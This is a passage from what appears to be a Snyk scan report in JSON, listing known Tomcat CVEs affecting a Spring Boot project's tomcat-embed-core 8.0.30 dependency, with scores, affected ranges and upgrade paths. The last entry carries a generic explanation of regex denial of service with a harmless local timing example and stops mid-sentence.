          "url": "https://lists.apache.org/thread.html/rccdef0349fdf4fb73a4e4403095446d7fe6264e0a58e2df5c6799434%40%3Cannounce.tomcat.apache.org%3E"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/tomcat/commit/34115fb3c83f6cd97772232316a492a4cc5729e0"
        },
        {
          "title": "RedHat Bugzilla Bug",
          "url": "https://bugzilla.redhat.com/show_bug.cgi?id=2004820"
        },
        {
          "title": "Tomcat Advisory 10",
          "url": "https://tomcat.apache.org/security-10.html%23Fixed_in_Apache_Tomcat_10.0.4"
        },
        {
          "title": "Tomcat Advisory 8",
          "url": "https://tomcat.apache.org/security-8.html%23Fixed_in_Apache_Tomcat_8.5.64"
        },
        {
          "title": "Tomcat Advisory 9",
          "url": "https://tomcat.apache.org/security-9.html%23Fixed_in_Apache_Tomcat_9.0.44"
        }
      ],
      "semver": {
        "vulnerable": [
          "[10.0.0, 10.0.4)",
          "[8.0.0, 8.5.64)",
          "[9.0.0, 9.0.44)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Denial of Service (DoS)",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "org.springframework.boot:spring-boot-starter-tomcat@1.3.1.RELEASE",
        "org.apache.tomcat.embed:tomcat-embed-core@8.0.30"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@2.3.10.RELEASE",
        "org.springframework.boot:spring-boot-starter-tomcat@2.3.10.RELEASE",
        "org.apache.tomcat.embed:tomcat-embed-core@9.0.45"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.apache.tomcat.embed:tomcat-embed-core",
      "version": "8.0.30"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N",
      "alternativeIds": [],
      "creationTime": "2017-02-22T07:28:26.724000Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 4.3,
      "description": "## Overview\r\n[`org.apache.tomcat.embed:tomcat-embed-core`](http://search.maven.org/#search%7Cga%7C1%7Ca%3A%22tomcat-embed-core%22)\r\nApache Tomcat 6.x before 6.0.45, 7.x before 7.0.68, 8.x before 8.0.31, and 9.x before 9.0.0.M2 does not place org.apache.catalina.manager.StatusManagerServlet on the org/apache/catalina/core/RestrictedServlets.properties list, which allows remote authenticated users to bypass intended SecurityManager restrictions and read arbitrary HTTP requests, and consequently discover session ID values, via a crafted web application.\r\n\r\n## References\r\n- [NVD](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-0706)",
      "disclosureTime": "2016-02-22T13:00:27Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "7.0.68",
        "8.0.32",
        "9.0.0.M3"
      ],
      "functions": [],
      "functions_new": [],
      "id": "SNYK-JAVA-ORGAPACHETOMCATEMBED-30986",
      "identifiers": {
        "CVE": [
          "CVE-2016-0706"
        ],
        "CWE": [
          "CWE-200"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "tomcat-embed-core",
        "groupId": "org.apache.tomcat.embed"
      },
      "modificationTime": "2020-12-14T14:41:02.030942Z",
      "moduleName": "org.apache.tomcat.embed:tomcat-embed-core",
      "packageManager": "maven",
      "packageName": "org.apache.tomcat.embed:tomcat-embed-core",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2016-02-22T13:00:27Z",
      "references": [
        {
          "title": "NVD",
          "url": "https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-0706"
        }
      ],
      "semver": {
        "vulnerable": [
          "[7.0.0,7.0.68)",
          "[8.0.0-RC1,8.0.32)",
          "[9.0.0.M1,9.0.0.M3)"
        ]
      },
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Information Exposure",
      "severityWithCritical": "medium",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "org.springframework.boot:spring-boot-starter-tomcat@1.3.1.RELEASE",
        "org.apache.tomcat.embed:tomcat-embed-core@8.0.30"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@1.3.3.RELEASE",
        "org.springframework.boot:spring-boot-starter-tomcat@1.3.3.RELEASE",
        "org.apache.tomcat.embed:tomcat-embed-core@8.0.32"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.apache.tomcat.embed:tomcat-embed-core",
      "version": "8.0.30"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
      "alternativeIds": [],
      "creationTime": "2017-02-22T07:28:26.744000Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.8,
      "description": "## Overview\r\n[`org.apache.tomcat.embed:tomcat-embed-core`](http://search.maven.org/#search%7Cga%7C1%7Ca%3A%22tomcat-embed-core%22)\r\nThe session-persistence implementation in Apache Tomcat 6.x before 6.0.45, 7.x before 7.0.68, 8.x before 8.0.31, and 9.x before 9.0.0.M2 mishandles session attributes, which allows remote authenticated users to bypass intended SecurityManager restrictions and execute arbitrary code in a privileged context via a web application that places a crafted object in a session.\r\n\r\n## References\r\n- [NVD](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-0714)",
      "disclosureTime": "2016-02-22T12:46:24Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "7.0.68",
        "8.0.32",
        "9.0.0.M3"
      ],
      "functions": [],
      "functions_new": [],
      "id": "SNYK-JAVA-ORGAPACHETOMCATEMBED-30987",
      "identifiers": {
        "CVE": [
          "CVE-2016-0714"
        ],
        "CWE": [
          "CWE-264"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "tomcat-embed-core",
        "groupId": "org.apache.tomcat.embed"
      },
      "modificationTime": "2020-12-14T14:41:02.113798Z",
      "moduleName": "org.apache.tomcat.embed:tomcat-embed-core",
      "packageManager": "maven",
      "packageName": "org.apache.tomcat.embed:tomcat-embed-core",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2016-02-22T12:46:24Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/tomcat80/commit/2e5cc28052e84ba45196949ba602484221bbf33c"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/tomcat80/commit/5430f30c79383e4d2d87785468905fcb00bace58"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/tomcat/commit/50f1b1da794cd93b70ab5456d3c2c984408e1506"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/tomcat/commit/79e8ad03404c131009811855f9a30d8d01c0c736"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/tomcat/commit/f626da75fd59da82b14dee7b8cc46ad51eefdbe5"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/tomcat/commit/ff1b659dc366a2ad47cd8f7e3544c796a1b15e46"
        },
        {
          "title": "NVD",
          "url": "https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-0714"
        }
      ],
      "semver": {
        "vulnerable": [
          "[7.0.0,7.0.68)",
          "[8.0.0-RC1,8.0.32)",
          "[9.0.0.M1,9.0.0.M3)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Access Restriction Bypass",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "org.springframework.boot:spring-boot-starter-tomcat@1.3.1.RELEASE",
        "org.apache.tomcat.embed:tomcat-embed-core@8.0.30"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@1.3.3.RELEASE",
        "org.springframework.boot:spring-boot-starter-tomcat@1.3.3.RELEASE",
        "org.apache.tomcat.embed:tomcat-embed-core@8.0.32"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.apache.tomcat.embed:tomcat-embed-core",
      "version": "8.0.30"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N",
      "alternativeIds": [],
      "creationTime": "2017-02-22T07:28:26.764000Z",
      "credit": [
        "The Apache Tomcat Security Team"
      ],
      "cvssScore": 5.9,
      "description": "## Overview\n[org.apache.tomcat.embed:tomcat-embed-core](https://mvnrepository.com/artifact/org.apache.tomcat.embed/tomcat-embed-core) is a Core Tomcat implementation.\n\nAffected versions of this package are vulnerable to Timing Attack. The `setGlobalContext` method in `ResourceLinkFactory.java` does not consider whether callers to this method are authorized, which allows remote authenticated users to bypass intended SecurityManager restrictions and read or write to arbitrary application data, or cause a denial of service (application disruption), via a web application that sets a crafted global context.\n## Remediation\nUpgrade `org.apache.tomcat.embed:tomcat-embed-core` to version 7.0.72, 8.0.37, 8.5.5, 9.0.0.M10 or higher.\n## References\n- [GitHub Commit](https://github.com/apache/tomcat80/commit/dc4c3317452f0bc2c5e1f6a08d3bd9f22488b450)\n- [GitHub Commit](https://github.com/apache/tomcat/commit/86b2e436099cb48f30dad950175c5beeeb763756)\n- [GitHub Commit](https://github.com/apache/tomcat/commit/970e615c7ade6ec6c341470bbc76aa1256353737)\n- [OSS security Advisory](http://www.openwall.com/lists/oss-security/2016/10/27/8)\n",
      "disclosureTime": "2016-10-28T04:54:04Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "7.0.72",
        "8.0.37",
        "8.5.5",
        "9.0.0.M10"
      ],
      "functions": [],
      "functions_new": [],
      "id": "SNYK-JAVA-ORGAPACHETOMCATEMBED-30988",
      "identifiers": {
        "CVE": [
          "CVE-2016-0762"
        ],
        "CWE": [
          "CWE-264"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "tomcat-embed-core",
        "groupId": "org.apache.tomcat.embed"
      },
      "modificationTime": "2020-12-14T14:41:36.234582Z",
      "moduleName": "org.apache.tomcat.embed:tomcat-embed-core",
      "packageManager": "maven",
      "packageName": "org.apache.tomcat.embed:tomcat-embed-core",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2016-10-28T04:54:04Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/tomcat80/commit/dc4c3317452f0bc2c5e1f6a08d3bd9f22488b450"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/tomcat/commit/86b2e436099cb48f30dad950175c5beeeb763756"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/tomcat/commit/970e615c7ade6ec6c341470bbc76aa1256353737"
        },
        {
          "title": "OSS security Advisory",
          "url": "http://www.openwall.com/lists/oss-security/2016/10/27/8"
        }
      ],
      "semver": {
        "vulnerable": [
          "[7.0.0,7.0.72)",
          "[8.0.0-RC1,8.0.37)",
          "[8.5.0,8.5.5)",
          "[9.0.0.M1,9.0.0.M10)"
        ]
      },
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Timing Attack",
      "severityWithCritical": "medium",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "org.springframework.boot:spring-boot-starter-tomcat@1.3.1.RELEASE",
        "org.apache.tomcat.embed:tomcat-embed-core@8.0.30"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@1.3.8.RELEASE",
        "org.springframework.boot:spring-boot-starter-tomcat@1.3.8.RELEASE",
        "org.apache.tomcat.embed:tomcat-embed-core@8.0.37"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.apache.tomcat.embed:tomcat-embed-core",
      "version": "8.0.30"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L",
      "alternativeIds": [],
      "creationTime": "2017-02-22T07:28:26.778000Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 6.3,
      "description": "## Overview\r\n[`org.apache.tomcat.embed:tomcat-embed-core`](http://search.maven.org/#search%7Cga%7C1%7Ca%3A%22tomcat-embed-core%22)\r\nThe setGlobalContext method in org/apache/naming/factory/ResourceLinkFactory.java in Apache Tomcat 7.x before 7.0.68, 8.x before 8.0.31, and 9.x before 9.0.0.M3 does not consider whether ResourceLinkFactory.setGlobalContext callers are authorized, which allows remote authenticated users to bypass intended SecurityManager restrictions and read or write to arbitrary application data, or cause a denial of service (application disruption), via a web application that sets a crafted global context.\r\n\r\n## References\r\n- [NVD](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-0763)",
      "disclosureTime": "2016-02-22T12:01:26Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "7.0.68",
        "8.0.32",
        "9.0.0.M3"
      ],
      "functions": [],
      "functions_new": [],
      "id": "SNYK-JAVA-ORGAPACHETOMCATEMBED-30989",
      "identifiers": {
        "CVE": [
          "CVE-2016-0763"
        ],
        "CWE": [
          "CWE-264"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "tomcat-embed-core",
        "groupId": "org.apache.tomcat.embed"
      },
      "modificationTime": "2020-12-14T14:41:02.131449Z",
      "moduleName": "org.apache.tomcat.embed:tomcat-embed-core",
      "packageManager": "maven",
      "packageName": "org.apache.tomcat.embed:tomcat-embed-core",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2016-02-22T12:01:26Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/tomcat80/commit/0531f7aeff1999d362e0a68512a3517f2cf1a6ae"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/tomcat/commit/76ebc9007567c8326217dd94844540e1e27d8468"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/tomcat/commit/c08641da04d31f730b56b8675301e55db97dfe88"
        },
        {
          "title": "NVD",
          "url": "https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-0763"
        }
      ],
      "semver": {
        "vulnerable": [
          "[7.0.0,7.0.68)",
          "[8.0.0-RC1,8.0.32)",
          "[9.0.0.M1,9.0.0.M3)"
        ]
      },
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Access Restriction Bypass",
      "severityWithCritical": "medium",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "org.springframework.boot:spring-boot-starter-tomcat@1.3.1.RELEASE",
        "org.apache.tomcat.embed:tomcat-embed-core@8.0.30"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@1.3.3.RELEASE",
        "org.springframework.boot:spring-boot-starter-tomcat@1.3.3.RELEASE",
        "org.apache.tomcat.embed:tomcat-embed-core@8.0.32"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.apache.tomcat.embed:tomcat-embed-core",
      "version": "8.0.30"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
      "alternativeIds": [],
      "creationTime": "2017-05-17T12:10:22.577000Z",
      "credit": [
        "Tomcat Security Team"
      ],
      "cvssScore": 9.1,
      "description": "## Overview\r\n[`org.apache.tomcat.embed:tomcat-embed-core`](http://search.maven.org/#search%7Cga%7C1%7Ca%3A%22tomcat-embed-core%22) is an open source implementation of the Java Servlet, JavaServer Pages, Java Expression Language and Java WebSocket technologies.\r\n\r\nAffected versions of this package are vulnerable to Information Disclosure. While investigating bug 60718, it was noticed that some calls to application listeners, It did not use the appropriate facade object. When running an untrusted application under a SecurityManager, it was therefore possible for that untrusted application to retain a reference to the request or response object and thereby access and/or modify information associated with another web application.\r\n\r\n## Remediation\r\nUpgrade `org.apache.tomcat.embed:tomcat-embed-core` to version 7.0.76, 8.0.42, 8.5.12, 9.0.0.M17 or higher..\r\n\r\n## References\r\n- [NVD](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2017-5648)\r\n- [Apache Mailing List](https://lists.apache.org/thread.html/d0e00f2e147a9e9b13a6829133092f349b2882bf6860397368a52600@%3Cannounce.tomcat.apache.org%3E)",
      "disclosureTime": "2017-04-11T02:17:12Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "7.0.76",
        "8.0.42",
        "8.5.12",
        "9.0.0.M17"
      ],
      "functions": [],
      "functions_new": [],
      "id": "SNYK-JAVA-ORGAPACHETOMCATEMBED-31420",
      "identifiers": {
        "CVE": [
          "CVE-2017-5648"
        ],
        "CWE": [
          "CWE-284"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "tomcat-embed-core",
        "groupId": "org.apache.tomcat.embed"
      },
      "modificationTime": "2020-12-14T14:41:39.712207Z",
      "moduleName": "org.apache.tomcat.embed:tomcat-embed-core",
      "packageManager": "maven",
      "packageName": "org.apache.tomcat.embed:tomcat-embed-core",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2017-05-21T07:52:38Z",
      "references": [
        {
          "title": "Apache Security Advisory",
          "url": "https://lists.apache.org/thread.html/d0e00f2e147a9e9b13a6829133092f349b2882bf6860397368a52600@%3Cannounce.tomcat.apache.org%3E"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/tomcat80/commit/6d73b079c55ee25dea1bbd0556bb568a4247dacd"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/tomcat/commit/0f7b9465d594b9814e1853d1e3a6e3aa51a21610"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/tomcat/commit/6bb36dfdf6444efda074893dff493b9eb3648808"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/tomcat/commit/dfa40863421d7681fed893b4256666491887e38c"
        },
        {
          "title": "NVD",
          "url": "https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2017-5648"
        }
      ],
      "semver": {
        "vulnerable": [
          "[7.0.0,7.0.76)",
          "[8.0.0-RC1,8.0.42)",
          "[8.5.0,8.5.12)",
          "[9.0.0.M1,9.0.0.M17)"
        ]
      },
      "severity": "critical",
      "socialTrendAlert": false,
      "title": "Information Exposure",
      "severityWithCritical": "critical",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "org.springframework.boot:spring-boot-starter-tomcat@1.3.1.RELEASE",
        "org.apache.tomcat.embed:tomcat-embed-core@8.0.30"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@1.4.6.RELEASE",
        "org.springframework.boot:spring-boot-starter-tomcat@1.4.6.RELEASE",
        "org.apache.tomcat.embed:tomcat-embed-core@8.5.13"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.apache.tomcat.embed:tomcat-embed-core",
      "version": "8.0.30"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
      "alternativeIds": [],
      "creationTime": "2017-05-17T12:10:22.669000Z",
      "credit": [
        "Tomcat Security Team"
      ],
      "cvssScore": 7.5,
      "description": "## Overview\n[org.apache.tomcat.embed:tomcat-embed-core](https://mvnrepository.com/artifact/org.apache.tomcat.embed/tomcat-embed-core) is a Core Tomcat implementation.\n\nAffected versions of this package are vulnerable to Information Exposure. A bug in the handling of the pipelined requests, when send file was used, results in the pipelined request being lost when send file processing of the previous request completed. This could result in responses appearing to be sent for the wrong request. For example, a user agent that sent requests A, B and C could see the correct response for request A, the response for request C for request B and no response for request C.\n## Remediation\nUpgrade `org.apache.tomcat.embed:tomcat-embed-core` to version 7.0.77, 8.0.43, 8.5.13, 9.0.0.M19 or higher.\n## References\n- [Apache Security Advisory](https://lists.apache.org/thread.html/5796678c5a773c6f3ff57c178ac247d85ceca0dee9190ba48171451a@%3Cusers.tomcat.apache.org%3E)\n- [GitHub Commit](https://github.com/apache/tomcat80/commit/ec10b8c785d1db91fe58946436f854dde04410fd)\n- [GitHub Commit](https://github.com/apache/tomcat/commit/864aa1199ad2cccc9a7e7c6b977f7d7f812c9910)\n- [GitHub Commit](https://github.com/apache/tomcat/commit/a4efd3ca1ccbdfc398136d76c0d8b7ad5a1e4905)\n- [GitHub Commit](https://github.com/apache/tomcat/commit/f5e06b8c743b1daa9eb5e817863958b6b320e044)\n- [NVD](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2017-5647)\n",
      "disclosureTime": "2017-04-11T05:42:07Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "7.0.77",
        "8.0.43",
        "8.5.13",
        "9.0.0.M19"
      ],
      "functions": [],
      "functions_new": [],
      "id": "SNYK-JAVA-ORGAPACHETOMCATEMBED-31432",
      "identifiers": {
        "CVE": [
          "CVE-2017-5647"
        ],
        "CWE": [
          "CWE-200"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "tomcat-embed-core",
        "groupId": "org.apache.tomcat.embed"
      },
      "modificationTime": "2020-12-03T10:42:20.084810Z",
      "moduleName": "org.apache.tomcat.embed:tomcat-embed-core",
      "packageManager": "maven",
      "packageName": "org.apache.tomcat.embed:tomcat-embed-core",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2017-05-21T07:52:38Z",
      "references": [
        {
          "title": "Apache Security Advisory",
          "url": "https://lists.apache.org/thread.html/5796678c5a773c6f3ff57c178ac247d85ceca0dee9190ba48171451a@%3Cusers.tomcat.apache.org%3E"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/tomcat80/commit/ec10b8c785d1db91fe58946436f854dde04410fd"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/tomcat/commit/864aa1199ad2cccc9a7e7c6b977f7d7f812c9910"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/tomcat/commit/a4efd3ca1ccbdfc398136d76c0d8b7ad5a1e4905"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/tomcat/commit/f5e06b8c743b1daa9eb5e817863958b6b320e044"
        },
        {
          "title": "NVD",
          "url": "https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2017-5647"
        }
      ],
      "semver": {
        "vulnerable": [
          "[7.0.0,7.0.77)",
          "[8.0.0-RC1,8.0.43)",
          "[8.5.0,8.5.13)",
          "[9.0.0.M1,9.0.0.M19)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Information Exposure",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "org.springframework.boot:spring-boot-starter-tomcat@1.3.1.RELEASE",
        "org.apache.tomcat.embed:tomcat-embed-core@8.0.30"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@1.4.6.RELEASE",
        "org.springframework.boot:spring-boot-starter-tomcat@1.4.6.RELEASE",
        "org.apache.tomcat.embed:tomcat-embed-core@8.5.13"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.apache.tomcat.embed:tomcat-embed-core",
      "version": "8.0.30"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
      "alternativeIds": [],
      "creationTime": "2019-07-04T08:15:25.869413Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 9.8,
      "description": "## Overview\n[org.apache.tomcat.embed:tomcat-embed-core](https://mvnrepository.com/artifact/org.apache.tomcat.embed/tomcat-embed-core) is a Core Tomcat implementation.\n\nAffected versions of this package are vulnerable to Insecure Defaults. The defaults settings for the `CORS` filter are insecure and enable `supportsCredentials` for all origins.\n## Remediation\nUpgrade `org.apache.tomcat.embed:tomcat-embed-core` to version 7.0.89, 8.0.53, 8.5.32, 9.0.9 or higher.\n## References\n- [Apache Security Advisory](https://lists.apache.org/thread.html/fbfb713e4f8a4c0f81089b89450828011343593800cae3fb629192b1@%3Cannounce.tomcat.apache.org%3E)\n- [Apache Tomcat Security-7](http://tomcat.apache.org/security-7.html)\n- [Apache Tomcat Security-8](http://tomcat.apache.org/security-8.html)\n- [Apache Tomcat Security-9](http://tomcat.apache.org/security-9.html)\n- [GitHub Commit](https://github.com/apache/tomcat/commit/d83a76732e6804739b81d8b2056365307637b42d)\n- [NVD](https://nvd.nist.gov/vuln/detail/CVE-2018-8014)\n",
      "disclosureTime": "2018-05-16T16:56:14Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "7.0.89",
        "8.0.53",
        "8.5.32",
        "9.0.9"
      ],
      "functions": [],
      "functions_new": [],
      "id": "SNYK-JAVA-ORGAPACHETOMCATEMBED-451505",
      "identifiers": {
        "CVE": [
          "CVE-2018-8014"
        ],
        "CWE": [
          "CWE-453"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "tomcat-embed-core",
        "groupId": "org.apache.tomcat.embed"
      },
      "modificationTime": "2020-12-14T14:41:29.085836Z",
      "moduleName": "org.apache.tomcat.embed:tomcat-embed-core",
      "packageManager": "maven",
      "packageName": "org.apache.tomcat.embed:tomcat-embed-core",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2018-05-21T08:32:28Z",
      "references": [
        {
          "title": "Apache Security Advisory",
          "url": "https://lists.apache.org/thread.html/fbfb713e4f8a4c0f81089b89450828011343593800cae3fb629192b1@%3Cannounce.tomcat.apache.org%3E"
        },
        {
          "title": "Apache Tomcat Security-7",
          "url": "http://tomcat.apache.org/security-7.html"
        },
        {
          "title": "Apache Tomcat Security-8",
          "url": "http://tomcat.apache.org/security-8.html"
        },
        {
          "title": "Apache Tomcat Security-9",
          "url": "http://tomcat.apache.org/security-9.html"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/tomcat/commit/d83a76732e6804739b81d8b2056365307637b42d"
        },
        {
          "title": "NVD",
          "url": "https://nvd.nist.gov/vuln/detail/CVE-2018-8014"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,7.0.89)",
          "[8.0.0, 8.0.53)",
          "[8.5.0, 8.5.32)",
          "[9.0.0, 9.0.9)"
        ]
      },
      "severity": "critical",
      "socialTrendAlert": false,
      "title": "Insecure Defaults",
      "severityWithCritical": "critical",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "org.springframework.boot:spring-boot-starter-tomcat@1.3.1.RELEASE",
        "org.apache.tomcat.embed:tomcat-embed-core@8.0.30"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@1.5.15.RELEASE",
        "org.springframework.boot:spring-boot-starter-tomcat@1.5.15.RELEASE",
        "org.apache.tomcat.embed:tomcat-embed-core@8.5.32"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.apache.tomcat.embed:tomcat-embed-core",
      "version": "8.0.30"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
      "alternativeIds": [],
      "creationTime": "2019-07-04T08:19:34.840671Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 7.5,
      "description": "## Overview\n[org.apache.tomcat.embed:tomcat-embed-core](https://mvnrepository.com/artifact/org.apache.tomcat.embed/tomcat-embed-core) is a Core Tomcat implementation.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS) via the UTF-8 decoder. When handling some special characters, the decoder may enter an infinite loop, thus denying service to other requests.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the 